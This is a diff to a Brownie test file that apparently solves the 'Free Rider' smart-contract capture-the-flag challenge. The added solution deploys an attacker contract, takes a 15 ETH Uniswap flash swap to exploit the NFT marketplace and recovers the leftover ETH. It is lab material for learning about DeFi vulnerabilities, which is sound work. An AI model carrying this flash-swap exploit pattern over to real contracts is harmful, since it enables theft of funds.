@@ -79,7 +79,7 @@ def test_solve_challenge():
     assert marketplace.amountOfOffers() == 6
 
     # Deploy buyer's contract, adding the attacker as the partner
-    buyer_contract = FreeRiderBuyer.deploy(attacker.address, nft.address, _fromDeployer | value_dict(BUYER_PAYOUT))
+    buyer_contract = FreeRiderBuyer.deploy(attacker.address, nft.address, _fromBuyer | value_dict(BUYER_PAYOUT))
 
     # check if solved
     def check_solution():
@@ -113,7 +113,30 @@ def test_solve_challenge():
     ##############################
     ##### SOLUTION GOES HERE #####
     ##############################
-    
+
+    # import attacker contract
+    from brownie import FreeRiderAttack;
+
+    # deploy attacker contract
+    attacker_contract = FreeRiderAttack.deploy(
+        uniswap_factory.address,
+        weth.address,
+        token.address,
+        marketplace.address,
+        nft.address,
+        buyer_contract.address,
+        _fromAttacker
+    )
+
+    # approve nft moving for attacker contract
+    nft.setApprovalForAll(attacker_contract.address, True, _fromAttacker)
+
+    # take the flash swap
+    attacker_contract.flashSwap(ether_to_wei(15), _fromAttacker)
+
+    # recover leftover ETH from the attacker contract
+    attacker_contract.recoverETH(_fromAttacker)
+
     ######################
     check_solution()
     
